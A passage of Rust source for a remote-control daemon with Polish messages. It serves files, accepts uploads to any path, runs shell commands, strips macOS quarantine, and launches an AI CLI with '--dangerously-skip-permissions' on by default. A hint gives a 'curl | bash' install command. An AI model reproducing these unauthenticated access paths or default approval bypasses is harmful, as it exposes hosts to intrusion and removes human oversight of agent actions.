                        .args(["-r", "-d", "com.apple.quarantine", app_path])
                        .output();
                    if let Err(e) = out {
                        errors.push(format!("Błąd usuwania kwarantanny z {}: {}", app_path, e));
                    }
                }
                if let Ok(exe) = std::env::current_exe() {
                    let out = std::process::Command::new("xattr")
                        .args(["-d", "com.apple.quarantine", &exe.to_string_lossy()])
                        .output();
                    if let Err(e) = out {
                        errors.push(format!("Błąd usuwania kwarantanny z exe {}: {}", exe.display(), e));
                    }
                }
                if errors.is_empty() {
                    (true, "Flaga kwarantanny macOS została pomyślnie usunięta ze wszystkich powiązanych plików.".to_string())
                } else {
                    (false, errors.join("; "))
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Kwarantanna dotyczy wyłącznie systemu macOS.".to_string())
            }
        }
        other => (false, format!("Nieznana akcja naprawcza: {}", other)),
    };

    Ok(Json(PermissionFixResponse {
        success,
        action: payload.action,
        message,
    }))
}

#[derive(Deserialize)]
struct QueryRequest {
    #[serde(default = "default_query_path")]
    path: String,
    #[serde(default = "default_max_depth")]
    max_depth: usize,
}

fn default_query_path() -> String {
    ".".to_string()
}

fn default_max_depth() -> usize {
    1
}

fn get_user_home() -> PathBuf {
    dirs_home().unwrap_or_else(|| PathBuf::from("."))
}

fn get_downloads_dir() -> PathBuf {
    let home = get_user_home();
    let downloads = home.join("Downloads");
    if downloads.exists() {
        downloads
    } else {
        home
    }
}

fn resolve_path(input: &str) -> PathBuf {
    let mut trimmed = input.trim();
    // Strip line fragment if present, e.g. /path/to/file#L10
    if let Some(pos) = trimmed.find('#') {
        trimmed = &trimmed[..pos];
    }
    // Strip URI schemes if present: file://localhost/, file:///, file://, file:
    let lower = trimmed.to_ascii_lowercase();
    if lower.starts_with("file://localhost/") {
        trimmed = &trimmed[16..];
    } else if lower.starts_with("file:///") {
        let rest = &trimmed[8..];
        let bytes = rest.as_bytes();
        if bytes.len() >= 2 && bytes[1] == b':' {
            trimmed = rest;
        } else {
            trimmed = &trimmed[7..]; // keeps leading '/' on Unix
        }
    } else if lower.starts_with("file://") {
        trimmed = &trimmed[7..];
    } else if lower.starts_with("file:") {
        trimmed = &trimmed[5..];
    }

    let home = get_user_home();

    if trimmed.is_empty() || trimmed == "." {
        let cwd = std::env::current_dir().unwrap_or_else(|_| home.clone());
        if cwd == PathBuf::from("/") {
            home
        } else {
            cwd
        }
    } else if trimmed == "~" || trimmed.starts_with("~/") || trimmed.starts_with("~\\") {
        if trimmed == "~" {
            home
        } else {
            home.join(&trimmed[2..])
        }
    } else {
        let p = PathBuf::from(trimmed);
        if p.is_relative() {
            let cwd = std::env::current_dir().unwrap_or_else(|_| home.clone());
            if cwd == PathBuf::from("/") {
                home.join(p)
            } else {
                cwd.join(p)
            }
        } else {
            p
        }
    }
}

async fn handle_query(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<QueryRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let target_path = resolve_path(&payload.path);
    let canonical = target_path.canonicalize().unwrap_or(target_path.clone());

    if !canonical.exists() {
        return Ok(Json(json!({
            "error": format!("Ścieżka '{}' nie istnieje", payload.path),
            "current_path": canonical.to_string_lossy(),
            "parent_path": null,
            "items": []
        })));
    }

    let parent_path = canonical.parent().map(|p| p.to_string_lossy().to_string());

    let mut items = Vec::new();
    let walker = WalkDir::new(&canonical)
        .max_depth(payload.max_depth)
        .into_iter()
        .filter_map(|e| e.ok());

    for entry in walker {
        if entry.depth() == 0 {
            continue;
        }
        let is_symlink = entry.file_type().is_symlink();
        let (is_dir, size, modified, symlink_target) = if is_symlink {
            let target = std::fs::read_link(entry.path()).ok().map(|p| p.to_string_lossy().to_string());
            if let Ok(target_meta) = std::fs::metadata(entry.path()) {
                let is_dir = target_meta.is_dir();
                let size = if is_dir { 0 } else { target_meta.len() };
                let mod_time = target_meta.modified().ok()
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs())
                    .unwrap_or(0);
                (is_dir, size, mod_time, target)
            } else {
                (false, 0, 0, target)
            }
        } else {
            let is_dir = entry.file_type().is_dir();
            let meta = entry.metadata().ok();
            let size = if is_dir { 0 } else { meta.as_ref().map(|m| m.len()).unwrap_or(0) };
            let mod_time = meta.and_then(|m| m.modified().ok())
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            (is_dir, size, mod_time, None)
        };

        let file_type = if is_dir { "dir" } else { "file" };
        let full_p = entry.path().to_string_lossy().to_string();
        let name = entry.file_name().to_string_lossy().to_string();

        items.push(json!({
            "name": name,
            "type": file_type,
            "is_dir": is_dir,
            "is_symlink": is_symlink,
            "symlink_target": symlink_target,
            "size": size,
            "modified": modified,
            "path": full_p
        }));

        if items.len() >= 300 {
            break;
        }
    }

    // Sort items: directories first, then files alphabetically
    items.sort_by(|a, b| {
        let a_dir = a.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
        let b_dir = b.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false);
        match (a_dir, b_dir) {
            (true, false) => std::cmp::Ordering::Less,
            (false, true) => std::cmp::Ordering::Greater,
            _ => {
                let a_name = a.get("name").and_then(|v| v.as_str()).unwrap_or("");
                let b_name = b.get("name").and_then(|v| v.as_str()).unwrap_or("");
                a_name.to_lowercase().cmp(&b_name.to_lowercase())
            }
        }
    });

    Ok(Json(json!({
        "path": payload.path,
        "current_path": canonical.to_string_lossy().to_string(),
        "parent_path": parent_path,
        "count": items.len(),
        "items": items
    })))
}

#[derive(Deserialize)]
struct ReadFileRequest {
    path: String,
}

async fn handle_read_file(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<ReadFileRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let target_path = resolve_path(&payload.path);
    let canonical = target_path.canonicalize().unwrap_or(target_path);

    if !canonical.exists() {
        return Ok(Json(json!({
            "error": format!("Plik '{}' nie istnieje", payload.path),
            "path": payload.path,
            "name": "",
            "size": 0,
            "content": "",
            "is_binary": false,
            "is_dir": false
        })));
    }

    if canonical.is_dir() {
        return Ok(Json(json!({
            "error": format!("'{}' jest katalogiem, a nie plikiem", payload.path),
            "path": canonical.to_string_lossy().to_string(),
            "name": canonical.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default(),
            "size": 0,
            "content": "",
            "is_binary": false,
            "is_dir": true
        })));
    }

    let file_name = canonical.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
    let meta = std::fs::metadata(&canonical);
    let size = meta.map(|m| m.len()).unwrap_or(0);

    const MAX_READ_BYTES: usize = 512 * 1024;
    let bytes = match std::fs::read(&canonical) {
        Ok(b) => b,
        Err(e) => {
            return Ok(Json(json!({
                "error": format!("Błąd odczytu pliku: {}", e),
                "path": canonical.to_string_lossy().to_string(),
                "name": file_name,
                "size": size,
                "content": "",
                "is_binary": false,
                "is_dir": false
            })));
        }
    };

    let is_binary = is_binary_content(&file_name, &bytes);
    let content = if is_binary {
        "[Zawartość binarna / podgląd tekstowy niedostępny]".to_string()
    } else {
        let truncated = if bytes.len() > MAX_READ_BYTES {
            &bytes[..MAX_READ_BYTES]
        } else {
            &bytes[..]
        };
        let mut text = String::from_utf8_lossy(truncated).to_string();
        if bytes.len() > MAX_READ_BYTES {
            text.push_str("\n\n[...plik został skrócony, rozmiar przekracza 500 KB...]");
        }
        text
    };

    let mime = guess_mime_type(&file_name);

    Ok(Json(json!({
        "path": canonical.to_string_lossy().to_string(),
        "name": file_name,
        "size": size,
        "content": content,
        "is_binary": is_binary,
        "is_dir": false,
        "mime_type": mime
    })))
}

fn guess_mime_type(file_name: &str) -> &'static str {
    let ext = file_name.rsplit('.').next().unwrap_or("").to_lowercase();
    match ext.as_str() {
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        "ogg" => "audio/ogg",
        "m4a" => "audio/mp4",
        "aac" => "audio/aac",
        "flac" => "audio/flac",
        "pdf" => "application/pdf",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "svg" => "image/svg+xml",
        "bmp" => "image/bmp",
        "ico" => "image/x-icon",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mkv" => "video/x-matroska",
        "mov" => "video/quicktime",
        "avi" => "video/x-msvideo",
        "m4v" => "video/x-m4v",
        "3gp" => "video/3gpp",
        "docx" => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "doc" => "application/msword",
        "xlsx" => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "xls" => "application/vnd.ms-excel",
        "pptx" => "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "ppt" => "application/vnd.ms-powerpoint",
        "odt" => "application/vnd.oasis.opendocument.text",
        "ods" => "application/vnd.oasis.opendocument.spreadsheet",
        "odp" => "application/vnd.oasis.opendocument.presentation",
        "rtf" => "application/rtf",
        "csv" => "text/csv; charset=utf-8",
        "tsv" => "text/tab-separated-values; charset=utf-8",
        "apk" => "application/vnd.android.package-archive",
        "epub" => "application/epub+zip",
        "txt" | "log" => "text/plain; charset=utf-8",
        "json" => "application/json",
        "md" => "text/markdown; charset=utf-8",
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" => "application/javascript",
        "rs" | "kt" | "py" | "java" | "c" | "cpp" | "h" | "go" | "sh" | "ps1" | "bat" | "cmd" | "yaml" | "yml" | "toml" | "ini" | "env" | "conf" | "properties" | "gradle" | "kts" | "xml" | "sql" => "text/plain; charset=utf-8",
        "zip" => "application/zip",
        "tar" => "application/x-tar",
        "gz" => "application/gzip",
        "7z" => "application/x-7z-compressed",
        "rar" => "application/vnd.rar",
        _ => "application/octet-stream",
    }
}

fn is_binary_content(file_name: &str, bytes: &[u8]) -> bool {
    let ext = file_name.rsplit('.').next().unwrap_or("").to_lowercase();
    const BINARY_EXTENSIONS: &[&str] = &[
        "zip", "rar", "tar", "gz", "bz2", "xz", "7z", "zst", "iso", "dmg", "pkg", "deb", "rpm",
        "apk", "aab", "exe", "dll", "so", "dylib", "bin", "dat", "db", "sqlite", "sqlite3",
        "class", "jar", "pyc", "pyo", "wasm", "o", "a", "lib", "ds_store",
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
        "png", "jpg", "jpeg", "gif", "webp", "ico", "bmp", "tiff", "psd", "ai",
        "mp3", "wav", "flac", "ogg", "m4a", "aac", "opus", "wma",
        "mp4", "mkv", "avi", "mov", "wmv", "flv", "webm", "m4v"
    ];
    if BINARY_EXTENSIONS.contains(&ext.as_str()) {
        return true;
    }

    let check_len = bytes.len().min(8192);
    if check_len == 0 {
        return false;
    }
    let slice = &bytes[..check_len];
    if slice.iter().any(|&b| b == 0) {
        return true;
    }
    let control_chars = slice.iter().filter(|&&b| b < 32 && b != 9 && b != 10 && b != 13 && b != 12).count();
    if control_chars * 100 / check_len > 3 {
        return true;
    }
    if std::str::from_utf8(slice).is_err() {
        let high_bytes = slice.iter().filter(|&&b| b > 127).count();
        if control_chars > 0 || high_bytes * 100 / check_len > 25 {
            return true;
        }
    }
    false
}

#[derive(Deserialize)]
struct FileRawParams {
    path: String,
    token: Option<String>,
}

async fn serve_raw_file(
    path_str: &str,
    token_opt: Option<&str>,
    headers: &HeaderMap,
    state: &AppState,
) -> Result<Response, StatusCode> {
    let expected = state.auth_token.read().await;
    let auth_ok = if expected.is_empty() {
        true
    } else if let Some(q_tok) = token_opt {
        q_tok.trim() == *expected
    } else {
        verify_auth(headers, state).await
    };

    if !auth_ok {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let target_path = resolve_path(path_str);
    let canonical = match target_path.canonicalize() {
        Ok(p) => p,
        Err(_) => return Err(StatusCode::NOT_FOUND),
    };

    if !canonical.exists() || canonical.is_dir() {
        return Err(StatusCode::NOT_FOUND);
    }

    let file_name = canonical
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "file".to_string());

    let bytes = match tokio::fs::read(&canonical).await {
        Ok(b) => b,
        Err(_) => return Err(StatusCode::INTERNAL_SERVER_ERROR),
    };

    let mime = guess_mime_type(&file_name);
    let size = bytes.len();

    let mut res = Response::new(axum::body::Body::from(bytes));
    res.headers_mut().insert(
        header::CONTENT_TYPE,
        HeaderValue::from_str(mime).unwrap_or(HeaderValue::from_static("application/octet-stream")),
    );
    res.headers_mut().insert(
        header::CONTENT_LENGTH,
        HeaderValue::from(size),
    );
    res.headers_mut().insert(
        header::ACCEPT_RANGES,
        HeaderValue::from_static("bytes"),
    );
    res.headers_mut().insert(
        header::CONTENT_DISPOSITION,
        HeaderValue::from_str(&format!("inline; filename=\"{}\"", file_name))
            .unwrap_or(HeaderValue::from_static("inline")),
    );

    Ok(res)
}

async fn handle_file_raw(
    headers: HeaderMap,
    State(state): State<AppState>,
    Query(params): Query<FileRawParams>,
) -> Result<Response, StatusCode> {
    serve_raw_file(&params.path, params.token.as_deref(), &headers, &state).await
}

async fn handle_file_raw_post(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<FileRawParams>,
) -> Result<Response, StatusCode> {
    serve_raw_file(&payload.path, payload.token.as_deref(), &headers, &state).await
}

#[derive(Deserialize)]
struct UploadParams {
    path: Option<String>,
    dir: Option<String>,
    filename: Option<String>,
    token: Option<String>,
}

#[derive(Serialize)]
struct UploadResponse {
    success: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    path: Option<String>,
    bytes_written: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

async fn handle_upload(
    headers: HeaderMap,
    State(state): State<AppState>,
    Query(params): Query<UploadParams>,
    body: axum::body::Body,
) -> impl IntoResponse {
    let expected = state.auth_token.read().await;
    let auth_ok = if expected.is_empty() {
        true
    } else if let Some(q_tok) = &params.token {
        q_tok.trim() == *expected
    } else {
        verify_auth(&headers, &state).await
    };

    if !auth_ok {
        log_message("⚠️ [handle_upload] Unauthorized upload attempt");
        return (
            StatusCode::UNAUTHORIZED,
            Json(UploadResponse {
                success: false,
                path: None,
                bytes_written: 0,
                error: Some("Unauthorized".to_string()),
            }),
        )
            .into_response();
    }

    let target_path = if let Some(ref p) = params.path {
        let p_trimmed = p.trim();
        if p_trimmed.is_empty() || p_trimmed == "." {
            let downloads = get_downloads_dir();
            if let Some(fname) = &params.filename {
                downloads.join(fname.trim())
            } else {
                downloads.join("upload.bin")
            }
        } else {
            let res = resolve_path(p_trimmed);
            if res == PathBuf::from("/") || (res.is_dir() && params.filename.is_some()) {
                let base = if res == PathBuf::from("/") {
                    get_downloads_dir()
                } else {
                    res
                };
                if let Some(fname) = &params.filename {
                    base.join(fname.trim())
                } else {
                    base.join("upload.bin")
                }
            } else {
                res
            }
        }
    } else if let (Some(dir), Some(fname)) = (&params.dir, &params.filename) {
        let dir_trimmed = dir.trim();
        let fname_trimmed = fname.trim();
        let base = if dir_trimmed.is_empty() || dir_trimmed == "." {
            get_downloads_dir()
        } else {
            let resolved = resolve_path(dir_trimmed);
            if resolved == PathBuf::from("/") {
                get_downloads_dir()
            } else {
                resolved
            }
        };
        base.join(fname_trimmed)
    } else {
        log_message("⚠️ [handle_upload] Missing path or dir+filename parameters");
        return (
            StatusCode::BAD_REQUEST,
            Json(UploadResponse {
                success: false,
                path: None,
                bytes_written: 0,
                error: Some("Missing 'path' or ('dir' and 'filename') query parameters".to_string()),
            }),
        )
            .into_response();
    };

    if let Some(parent) = target_path.parent() {
        if !parent.exists() {
            if let Err(e) = tokio::fs::create_dir_all(parent).await {
                let err_msg = format!("Failed to create parent directory '{}': {}", parent.display(), e);
                log_message(&format!("❌ [handle_upload] {}", err_msg));
                return (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    Json(UploadResponse {
                        success: false,
                        path: Some(target_path.to_string_lossy().to_string()),
                        bytes_written: 0,
                        error: Some(err_msg),
                    }),
                )
                    .into_response();
            }
        }
    }

    let mut file = match tokio::fs::File::create(&target_path).await {
        Ok(f) => f,
        Err(e) => {
            let err_msg = format!("Failed to create destination file '{}': {}", target_path.display(), e);
            log_message(&format!("❌ [handle_upload] {}", err_msg));
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(UploadResponse {
                    success: false,
                    path: Some(target_path.to_string_lossy().to_string()),
                    bytes_written: 0,
                    error: Some(err_msg),
                }),
            )
                .into_response();
        }
    };

    use tokio::io::AsyncWriteExt;
    use tokio_stream::StreamExt;
    let mut stream = body.into_data_stream();
    let mut bytes_written = 0u64;

    while let Some(chunk_res) = stream.next().await {
        match chunk_res {
            Ok(chunk) => {
                if let Err(e) = file.write_all(&chunk).await {
                    let err_msg = format!("Error writing to file '{}': {}", target_path.display(), e);
                    log_message(&format!("❌ [handle_upload] {}", err_msg));
                    return (
                        StatusCode::INTERNAL_SERVER_ERROR,
                        Json(UploadResponse {
                            success: false,
                            path: Some(target_path.to_string_lossy().to_string()),
                            bytes_written,
                            error: Some(err_msg),
                        }),
                    )
                        .into_response();
                }
                bytes_written += chunk.len() as u64;
            }
            Err(e) => {
                let err_msg = format!("Error streaming request body: {}", e);
                log_message(&format!("❌ [handle_upload] {}", err_msg));
                return (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    Json(UploadResponse {
                        success: false,
                        path: Some(target_path.to_string_lossy().to_string()),
                        bytes_written,
                        error: Some(err_msg),
                    }),
                )
                    .into_response();
            }
        }
    }

    if let Err(e) = file.flush().await {
        let err_msg = format!("Error flushing file '{}': {}", target_path.display(), e);
        log_message(&format!("❌ [handle_upload] {}", err_msg));
        return (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(UploadResponse {
                success: false,
                path: Some(target_path.to_string_lossy().to_string()),
                bytes_written,
                error: Some(err_msg),
            }),
        )
            .into_response();
    }

    log_message(&format!(
        "📤 [handle_upload] Saved {} bytes to '{}'",
        bytes_written,
        target_path.display()
    ));

    (
        StatusCode::OK,
        Json(UploadResponse {
            success: true,
            path: Some(target_path.to_string_lossy().to_string()),
            bytes_written,
            error: None,
        }),
    )
        .into_response()
}

#[derive(Deserialize)]
struct ExecRequest {
    cmd: String,
}

async fn handle_exec(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<ExecRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let result = run_shell_command(&payload.cmd, Duration::from_secs(60)).await;
    Ok(Json(result))
}

#[derive(Deserialize)]
struct AskRequest {
    #[serde(alias = "prompt")]
    question: String,
    #[serde(default = "default_auto_approve")]
    auto_approve: bool,
    conversation_id: Option<String>,
}

fn default_auto_approve() -> bool {
    true
}

async fn handle_ask(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<AskRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    log_message(&format!(
        "📩 [handle_ask] Received question: '{}' (conv: {:?}, auto_approve: {})",
        payload.question, payload.conversation_id, payload.auto_approve
    ));
    if !verify_auth(&headers, &state).await {
        log_message("⚠️ [handle_ask] Unauthorized request");
        return Err(StatusCode::UNAUTHORIZED);
    }

    session_log::log_session_event(session_log::SessionLogEntry {
        event: "session_start".to_string(),
        node: state.node_name.clone(),
        conversation_id: payload.conversation_id.clone(),
        question: Some(payload.question.clone()),
        ..Default::default()
    });

    let cli_path = match &state.agy_cli_path {
        Some(p) => p.clone(),
        None => match discover_agy_cli(None) {
            Some(discovered) => discovered,
            None => {
                session_log::log_session_event(session_log::SessionLogEntry {
                    event: "session_end".to_string(),
                    node: state.node_name.clone(),
                    conversation_id: payload.conversation_id.clone(),
                    status: Some("error".to_string()),
                    returncode: Some(-1),
                    final_response: Some("No AI CLI found on this node.".to_string()),
                    ..Default::default()
                });
                return Ok(Json(json!({
                    "error": "No AI CLI (agy, gemini, claude) is installed or found on this node. Install one and restart the daemon, or use --agy-path to specify the binary location.",
                    "returncode": -1,
                    "hint": "Install Google Antigravity CLI: curl -fsSL https://antigravity.google/cli/install.sh | bash"
                })));
            }
        },
    };

    let is_agy = cli_path.ends_with("agy") || cli_path.ends_with("agy.exe");
    let mut process = Command::new(&cli_path);
    let work_dir = {
        let cwd = std::env::current_dir().unwrap_or_else(|_| get_user_home());
        if cwd == PathBuf::from("/") {
            get_user_home()
        } else {
            cwd
        }
    };
    process.current_dir(&work_dir);

    if is_agy {
        process.arg("--output-format").arg("json");
        if let Some(ref conv_id) = payload.conversation_id {
            let trimmed = conv_id.trim();
            if !trimmed.is_empty() {
                process.arg("--conversation").arg(trimmed);
            }
        }
        process.arg("--print-timeout").arg("60m");
    }

    if payload.auto_approve {
        process.arg("--dangerously-skip-permissions");
    }
    process.arg("--print");
    process.arg(&payload.question);
    process.stdout(Stdio::piped()).stderr(Stdio::piped());

    let dur = Duration::from_secs(3600);
    let result = match timeout(dur, process.output()).await {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let returncode = output.status.code().unwrap_or(-1);

            let (clean_stdout, conv_id) = if is_agy {
                let parsed = serde_json::from_str::<serde_json::Value>(&stdout).or_else(|_| {
                    if let (Some(s), Some(e)) = (stdout.find('{'), stdout.rfind('}')) {
                        if s < e {
                            serde_json::from_str::<serde_json::Value>(&stdout[s..=e])
                        } else {
                            Err(serde_json::Error::io(
                                std::io::ErrorKind::InvalidData.into(),
                            ))
                        }
                    } else {
                        Err(serde_json::Error::io(
                            std::io::ErrorKind::InvalidData.into(),
                        ))
                    }
                });

                match parsed {
                    Ok(val) => {
                        let text = val
                            .get("response")
                            .and_then(|v| v.as_str())
                            .unwrap_or(&stdout)
                            .to_string();
                        let cid = val
                            .get("conversation_id")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string());
                        (text, cid)
                    }
                    Err(_) => (stdout, None),
                }
            } else {
                (stdout, None)
            };

            json!({
                "returncode": returncode,
                "stdout": clean_stdout,
                "stderr": stderr,
                "conversation_id": conv_id
            })
        }
        Ok(Err(e)) => json!({
            "returncode": -1,
            "error": format!("Failed to execute process: {}", e)
        }),
        Err(_) => {
            session_log::log_session_event(session_log::SessionLogEntry {
                event: "session_end".to_string(),
                node: state.node_name.clone(),
                conversation_id: payload.conversation_id.clone(),
                status: Some("timeout".to_string()),
                returncode: Some(-1),
                ..Default::default()
            });
            json!({
                "returncode": -1,
                "error": format!("Command timed out after {} seconds", dur.as_secs())
            })
        }
    };

    let rc = result.get("returncode").and_then(|r| r.as_i64()).unwrap_or(-1) as i32;
    let final_conv_id = result
        .get("conversation_id")
        .and_then(|c| c.as_str())
        .map(|s| s.to_string())
        .or(payload.conversation_id.clone());
    let final_resp = result
        .get("stdout")
        .and_then(|s| s.as_str())
        .or_else(|| result.get("error").and_then(|e| e.as_str()))
        .map(|s| s.to_string());

    session_log::log_session_event(session_log::SessionLogEntry {
        event: "session_end".to_string(),
        node: state.node_name.clone(),
        conversation_id: final_conv_id,
        final_response: final_resp,
        status: Some(if rc == 0 { "ok" } else { "error" }.to_string()),
        returncode: Some(rc),
        ..Default::default()
    });

    log_message(&format!(
        "📤 [handle_ask] Completed. Status: {:?}",
        result.get("returncode")
    ));
    Ok(Json(result))
}

async fn handle_ask_stream(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<AskRequest>,
) -> Result<
    Sse<impl tokio_stream::Stream<Item = Result<Event, std::convert::Infallible>>>,
    StatusCode,
> {
    log_message(&format!(
        "🌊 [handle_ask_stream] Streaming requested for: '{}' (conv: {:?})",
        payload.question, payload.conversation_id
    ));
    if !verify_auth(&headers, &state).await {
        log_message("⚠️ [handle_ask_stream] Unauthorized request");
        return Err(StatusCode::UNAUTHORIZED);
    }

    let cli_path = match &state.agy_cli_path {
        Some(p) => p.clone(),
        None => match discover_agy_cli(None) {
            Some(discovered) => discovered,
            None => {
                return Err(StatusCode::NOT_FOUND);
            }
        },
    };

    let is_agy = cli_path.ends_with("agy") || cli_path.ends_with("agy.exe");
    let (tx, rx) = tokio::sync::mpsc::channel::<Result<Event, std::convert::Infallible>>(100);

    // Capture node identity and question for the session log before moving payload into spawn
    let node_name = state.node_name.clone();

    session_log::log_session_event(session_log::SessionLogEntry {
        event: "session_start".to_string(),
        node: node_name.clone(),
        conversation_id: payload.conversation_id.clone(),
        question: Some(payload.question.clone()),
        ..Default::default()
    });

    tokio::spawn(async move {
        let work_dir = {
            let cwd = std::env::current_dir().unwrap_or_else(|_| get_user_home());
            if cwd == PathBuf::from("/") {
                get_user_home()
            } else {
                cwd
            }
        };
        let mut cmd = Command::new(&cli_path);
        cmd.current_dir(&work_dir);
        if is_agy {
            cmd.arg("--output-format").arg("stream-json");
            if let Some(ref conv_id) = payload.conversation_id {
                let trimmed = conv_id.trim();
                if !trimmed.is_empty() {
                    cmd.arg("--conversation").arg(trimmed);
                }
            }
            cmd.arg("--print-timeout").arg("60m");
        }
        if payload.auto_approve {
            cmd.arg("--dangerously-skip-permissions");
        }
        cmd.arg("--print");
        cmd.arg(&payload.question);
        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                let err_msg = format!("Nie udało się uruchomić procesu: {}", e);
                log_message(&format!("❌ [handle_ask_stream] {}", err_msg));
                session_log::log_session_event(session_log::SessionLogEntry {
                    event: "session_end".to_string(),
                    node: node_name.clone(),
                    conversation_id: payload.conversation_id.clone(),
                    status: Some("error".to_string()),
                    returncode: Some(-1),
                    final_response: Some(err_msg.clone()),
                    ..Default::default()
                });
                let _ = tx
                    .send(Ok(Event::default()
                        .event("error")
                        .data(err_msg)))
                    .await;
                return;
            }
        };

        // Drain stderr asynchronously to avoid pipe buffer deadlock (64KB pipe buffer)
        let stderr_handle = if let Some(stderr) = child.stderr.take() {
            Some(tokio::spawn(async move {
                use tokio::io::AsyncReadExt;
                let mut reader = tokio::io::BufReader::new(stderr);
                let mut buffer = Vec::new();
                let _ = reader.read_to_end(&mut buffer).await;
                String::from_utf8_lossy(&buffer).to_string()
            }))
        } else {
            None
        };

        if let Some(stdout) = child.stdout.take() {
            use tokio::io::AsyncBufReadExt;
            let mut reader = tokio::io::BufReader::new(stdout).lines();

            let _ = tx
                .send(Ok(Event::default()
                    .event("status")
                    .data("Agent analizuje zapytanie...")))
                .await;

            let mut final_response = String::new();
            let mut final_conv_id = payload.conversation_id.clone();
            let mut final_returncode = 0;

            let mut client_disconnected = false;

            while let Ok(Ok(Some(line_str))) =
                timeout(Duration::from_secs(3600), reader.next_line()).await
            {
                if tx.is_closed() && !client_disconnected {
                    client_disconnected = true;
                    log_message("⚠️ [handle_ask_stream] Mobile client connection dropped; AI process continuing in background to finish task...");
                    session_log::log_session_event(session_log::SessionLogEntry {
                        event: "client_disconnected_backgrounding".to_string(),
                        node: node_name.clone(),
                        conversation_id: final_conv_id.clone(),
                        status: Some("backgrounding".to_string()),
                        ..Default::default()
                    });
                }

                if line_str.trim().is_empty() {
                    continue;
                }

                if let Ok(val) = serde_json::from_str::<serde_json::Value>(&line_str)
                    && let Some(event_type) = val.get("event").and_then(|e| e.as_str())
                {
                    match event_type {
                        "step_update" => {
                            if let Some(su) = val.get("step_update") {
                                let step_type =
                                    su.get("step_type").and_then(|s| s.as_str()).unwrap_or("");
                                let state_str =
                                    su.get("state").and_then(|s| s.as_str()).unwrap_or("");

                                if step_type == "tool" {
                                    let tool_name = su
                                        .get("tool_name")
                                        .and_then(|t| t.as_str())
                                        .unwrap_or("narzędzie");
                                    let tool_args = su
                                        .get("tool_info")
                                        .and_then(|ti| ti.get("parameters"))
                                        .cloned();
                                    let mut detail = String::new();
                                    if let Some(info) =
                                        su.get("tool_info").and_then(|ti| ti.get("parameters"))
                                    {
                                        if let Some(c) =
                                            info.get("CommandLine").and_then(|cl| cl.as_str())
                                        {
                                            let preview = if c.len() > 60 {
                                                format!("{}…", &c[..60])
                                            } else {
                                                c.to_string()
                                            };
                                            detail = format!(": {}", preview);
                                        } else if let Some(p) =
                                            info.get("DirectoryPath").and_then(|dp| dp.as_str())
                                        {
                                            let preview = if p.len() > 50 {
                                                format!("…{}", &p[p.len() - 50..])
                                            } else {
                                                p.to_string()
                                            };
                                            detail = format!(" w {}", preview);
                                        } else if let Some(f) = info
                                            .get("TargetFile")
                                            .or_else(|| info.get("AbsolutePath"))
                                            .and_then(|af| af.as_str())
                                        {
                                            let preview = if f.len() > 50 {
                                                format!("…{}", &f[f.len() - 50..])
                                            } else {
                                                f.to_string()
                                            };
                                            detail = format!(": {}", preview);
                                        }
                                    }

                                    // Log every tool invocation immediately — survives disconnects
                                    if state_str == "ACTIVE" {
                                        session_log::log_session_event(session_log::SessionLogEntry {
                                            event: "tool_call".to_string(),
                                            node: node_name.clone(),
                                            conversation_id: final_conv_id.clone(),
                                            tool_name: Some(tool_name.to_string()),
                                            tool_args,
                                            ..Default::default()
                                         });
                                    } else {
                                        session_log::log_session_event(session_log::SessionLogEntry {
                                            event: "tool_result".to_string(),
                                            node: node_name.clone(),
                                            conversation_id: final_conv_id.clone(),
                                            tool_name: Some(tool_name.to_string()),
                                            ..Default::default()
                                        });
                                    }

                                    let status_msg = if state_str == "ACTIVE" {
                                        format!("⚙️ Wykonywanie {}{}", tool_name, detail)
                                    } else {
                                        format!("✅ Zakończono {}{}", tool_name, detail)
                                    };
                                    let _ = tx
                                        .send(Ok(Event::default().event("status").data(status_msg)))
                                        .await;
                                } else if step_type == "agent_response"
